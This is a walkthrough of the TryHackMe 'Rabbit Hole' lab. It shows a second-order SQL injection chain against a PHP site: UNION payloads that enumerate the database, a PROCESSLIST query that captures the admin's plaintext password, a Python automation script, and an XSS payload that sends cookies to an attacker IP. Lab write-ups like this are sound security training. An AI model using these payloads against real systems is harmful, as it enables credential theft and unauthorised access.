# TryHackMe - Rabbit Hole

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** Web, SQL Injection (second-order)  
**Room:** [Rabbit Hole](https://tryhackme.com/room/rabbitholeqq)  
**Author:** shamollash

## Introduction

*"It's easy to fall into rabbit holes."* This room lives up to its name: many deliberate dead ends surround a single, elegant exploitation path.

**Objectives:**
- Escalate from web application access to SSH as `admin`
- Retrieve the flag on the target system

---

## Reconnaissance

Deploy the machine, note the IP, and optionally add it to `/etc/hosts`:

```bash
echo "<TARGET_IP> rabbithole.thm" | sudo tee -a /etc/hosts
```

### Nmap

A full port scan identifies exposed services:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Typical findings:
- **Port 22** — OpenSSH
- **Port 80** — Apache + PHP recruitment site

Directory brute-force (`gobuster`, `feroxbuster`) does not reveal hidden folders. The application exposes:

- `/` — homepage
- `/register.php` — account creation
- `/login.php` — authentication

The login page hints that *"anti-bruteforce measures are implemented with database queries"*. Each login attempt takes ~5 seconds — consistent with a `SLEEP(5)` in SQL.

---

## Enumeration

### Normal registration flow

Create a test account (`test:test`) and log in. The homepage shows:

- Your username
- A **"last logins"** table with recent connections
- An **admin** user logging in roughly every minute (automated)

### Dead end #1 — XSS / cookie theft

The username is reflected on the page, tempting a stored XSS payload:

```html
<script>new Image().src="http://<YOUR_IP>/?c="+document.cookie;</script>
```

This works for your own session but never fires for admin — likely automated login via `curl`, not a browser.

### Dead end #2 — Session fixation

`PHPSESSID` can be fixed manually and does not rotate reliably. Interesting in theory, but useless without stealing admin's session.

### Breakthrough — Second-order SQL injection

Register a username containing a double quote, e.g. `test"user`:

- Registration/login → no error
- Homepage (last logins table) → **MariaDB syntax error**

```
SQLSTATE[42000]: Syntax error ... near 'test"user" ORDER BY login_time DESC LIMIT 0,5'
```

**Second-order SQLi:** the payload is stored safely at registration (prepared statements on login), but executed unsafely when the app builds a query from stored usernames for the dashboard.

Workflow for each test:
1. Register with payload as username
2. Login with same username
3. Read response on `/`

---

## Exploitation

### UNION-based enumeration

Determine column count:

```sql
" UNION SELECT 1,2 -- -
```

→ Two columns; the second is displayed in the table.

Standard enumeration:

```sql
" UNION SELECT 1,database() -- -
→ web

" UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='web' -- -
→ users,logins

" UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='web' AND table_name='users' -- -
→ id,username,password,group
```

### Dead end #3 — Hash dump

```sql
" UNION SELECT 1,password FROM web.users -- -
```

Output is truncated to **16 characters** — a full MD5 hash is 32 chars.

Partial reads with `SUBSTRING` recover the admin hash, but it does **not** crack with rockyou.

Users `foo` and `bar` have crackable hashes mapping to obvious passwords — intentional **rabbit holes**. SSH with those credentials fails.

Other dead ends:
- Updating admin hash in DB → web login works, no flag
- Table `logins` → only username + timestamp
- Cracking admin hash → not feasible

---

### PROCESSLIST — capturing the admin password

The login query (simplified):

```php
$stmt = $pdo->prepare('SELECT * from users where (username= ? and password=md5(?) ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2');
$stmt->execute([$_POST['username'], $_POST['password']]);
```

The password is passed **in plaintext** to MySQL, which applies `md5()`. During the 5-second `SLEEP`, the active query remains visible in:

```sql
information_schema.PROCESSLIST
```

Payload to read running queries:

```sql
" UNION SELECT 1,INFO FROM information_schema.PROCESSLIST WHERE INFO NOT LIKE '%info%' -- -
```

Refresh the homepage while admin logs in to capture a query like:

```sql
SELECT * from users where (username= 'admin' and password=md5('<REDACTED>') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
```

**Manual timing:** create multiple users with `MID()`/`SUBSTRING` on different 16-char blocks of `INFO`, fix distinct `PHPSESSID` per account, log all in, and refresh until admin's login appears.

**Automated approach:** multi-threaded Python script (see [jaxafed's write-up](https://matty69v.app/posts/tryhackme-rabbit-hole/)) that registers accounts with chunked `SUBSTR` payloads and polls in parallel.

Example helper script for basic enumeration:

```python
#!/usr/bin/env python3
import requests, sys
from bs4 import BeautifulSoup

url = sys.argv[1]
query = sys.argv[2]
idx = 1

while True:
    payload = f'" UNION SELECT 1,SUBSTR(({query}), {idx}, 16);#'
    s = requests.Session()
    s.post(url + "register.php", data={"username": payload, "password": "x", "submit": "Submit Query"})
    s.post(url + "login.php", data={"username": payload, "password": "x", "login": "Submit Query"})
    r = s.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    chunk = tables[1].find("td").get_text()
    print(chunk, end="", flush=True)
    if len(chunk) < 16:
        break
    idx += 16
print()
```

---

## Post-exploitation

### SSH access

```bash
ssh admin@<TARGET_IP>
# Password: [obtained from PROCESSLIST — complete the room]
cat ~/flag.txt
```

Bonus: `sudo -l` shows admin can escalate further; PHP source lives under `/root/sqlinception/web/`.

---

## Flags

| Objective | How to obtain |
|-----------|---------------|
| User/system flag | SSH as `admin` with password captured via PROCESSLIST |

*Flag value intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/rabbitholeqq).*

---

## Conclusion

### What I learned

| Concept | Lesson |
|---------|--------|
| Second-order SQLi | Payload stored at registration, triggered elsewhere |
| Rabbit holes | XSS, crackable hashes, foo/bar users are deliberate misdirection |
| PROCESSLIST | Active queries can leak secrets during long-running statements |
| Timing | Admin logs in every ~60s → 5s window to spy on `SLEEP` queries |
| MD5 in SQL | Passing plaintext to `md5(?)` enables credential leakage via `INFO` |

Do not follow every white rabbit — focus on where unsanitized data is **read back** from the database.
